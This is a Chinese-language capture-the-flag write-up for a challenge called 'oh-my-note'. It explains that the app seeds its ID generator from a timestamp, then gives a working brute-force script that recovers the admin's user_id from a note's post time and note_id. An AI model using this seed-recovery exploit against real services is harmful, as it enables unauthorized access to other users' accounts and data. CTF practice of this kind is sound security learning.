# oh-my-note

首先拿到源码，分析源码得知重点是下面这段代码

```
timestamp = round(time.time(), 4)
post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
random.seed(user_id + post_at)
note_id = get_random_id()
```

用户第一次发送note的时候会以当前获取的时间的时间戳来设置随机数种子，并以这个种子为基础来生成user_id和note_id，同一个用户后面发送的note生成note_id时会直接使用数据库里存的user_id作为种子的一部分，所以我们翻一下已经发出来的note，找到admin最先发送的note，在这个post time附近去搜索当时准确的时间戳就可以在本地搜索找到admin的user_id了，然后向`/my_notes`发送user_id即可看到admin所有的notes了，其中包含一个有flag的note。

参考的exp如下

```
import random
import string
import time


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)

    return ''.join([random.choice(alphabet) for _ in range(32)])


post_at = "2021-01-15 02:29 UTC"
timeArray = time.strptime(post_at, "%Y-%m-%d %H:%M UTC")
base_timestamp = int(time.mktime(timeArray) - time.mktime(time.gmtime(0)))

y = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'
flag = False

for i in range(0, 60):
    for j in range(0, 10000):
        timestamp = base_timestamp + i + round(j / 10000, 4)
        random.seed(timestamp)
        user_id = get_random_id()
        random.seed(user_id + post_at)
        note_id = get_random_id()
        if note_id == y:
            print(user_id)
            flag = True
            break
    if flag:
        break
```